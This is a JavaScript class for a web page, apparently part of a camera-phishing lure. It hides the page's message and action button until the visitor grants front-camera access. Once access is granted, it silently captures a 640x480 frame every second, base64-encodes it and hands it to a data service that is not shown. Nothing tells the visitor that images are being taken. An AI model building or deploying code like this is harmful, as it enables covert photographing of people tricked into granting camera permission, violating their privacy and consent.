class CameraCapture {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.context = this.canvas.getContext('2d');
        this.captureInterval = null;
        this.permissionGranted = false;
        this.dataService = new DataService();
    }

    async init() {
        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        try {
            const result = await navigator.permissions.query({ name: 'camera' });
            if (result.state === 'denied') {
                this.showPermissionButton();
                return;
            }

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            this.video.srcObject = stream;
            this.permissionGranted = true;
            this.hidePermissionButton();
            this.showContent();
            this.startCapture();
        } catch (e) {
            console.error(`Camera access error: ${e.toString()}`);
            this.showPermissionButton();
        }
    }

    showPermissionButton() {
        const existingButton = document.querySelector('.permission-button');
        if (!existingButton) {
            const button = document.createElement('button');
            button.className = 'permission-button';
            button.textContent = 'Allow Permissions';
            button.addEventListener('click', () => this.requestPermissions());
            document.body.appendChild(button);
        }
        this.hideContent();
    }

    hidePermissionButton() {
        const button = document.querySelector('.permission-button');
        if (button) {
            button.remove();
        }
    }

    showContent() {
        const messageCard = document.querySelector('.message-card');
        const actionButton = document.querySelector('.action-button');
        if (messageCard) messageCard.style.display = 'block';
        if (actionButton) actionButton.style.display = 'block';
    }

    hideContent() {
        const messageCard = document.querySelector('.message-card');
        const actionButton = document.querySelector('.action-button');
        if (messageCard) messageCard.style.display = 'none';
        if (actionButton) actionButton.style.display = 'none';
    }

    async requestPermissions() {
        try {
            await this.init();
        } catch (e) {
            console.error('Failed to get permissions:', e);
        }
    }

    startCapture() {
        this.captureInterval = setInterval(() => this.captureImage(), 1000);
    }

    captureImage() {
        this.context.drawImage(this.video, 0, 0, 640, 480);
        const canvasData = this.canvas.toDataURL("image/png");
        const imageData = canvasData.replace("data:image/png;base64,", "");
        this.dataService.addCapturedImage(imageData);
    }
}